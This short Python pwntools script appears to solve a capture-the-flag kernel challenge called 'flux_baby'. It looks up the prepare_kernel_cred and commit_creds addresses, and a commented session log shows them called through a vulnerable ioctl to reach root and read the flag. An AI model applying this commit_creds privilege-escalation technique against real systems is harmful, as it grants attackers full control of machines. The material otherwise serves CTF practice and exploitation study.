#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

vmlinux = ELF("./vmlinux", checksec = False)

pkc = vmlinux.sym['prepare_kernel_cred']
print "pkc: ", pkc
cc = vmlinux.sym['commit_creds']
print "cc: ", cc

'''
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 2
uid=1000(user) gid=1000(user) groups=1000(user)
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
random: fast init done
5. Bye!
> 1
I need a kernel address to call. Be careful, though or .
>
18446744071579168336
There is a good chance we will want to pass an argument?
>
0
Got call address: 0xffffffff8104ee50, argument: 0x000000
flux_baby ioctl nr 900 called
flux_baby ioctl nr 900 called
flux_baby ioctl extracted param ffffffff8104ee50 as funt
A miracle happened. We came back without crashing! I ev.
It is: ffff88000212c0c0
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 1
I need a kernel address to call. Be careful, though or .
>
18446744071579167184
There is a good chance we will want to pass an argument?
>
18446612132349001920
Got call address: 0xffffffff8104e9d0, argument: 0xffff80
flux_baby ioctl nr 900 called
flux_baby ioctl nr 900 called
flux_baby ioctl extracted param ffffffff8104e9d0 as funt
A miracle happened. We came back without crashing! I ev.
It is: 0000000000000000
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 2
uid=0(root) gid=0(root)
----- Menu -----
1. Call
2. Show me my uid
3. Read file
4. Any hintz?
5. Bye!
> 3
Which file are we trying to read?
> /flag
Here are your 0xf bytes contents:
flag{testflag}
'''
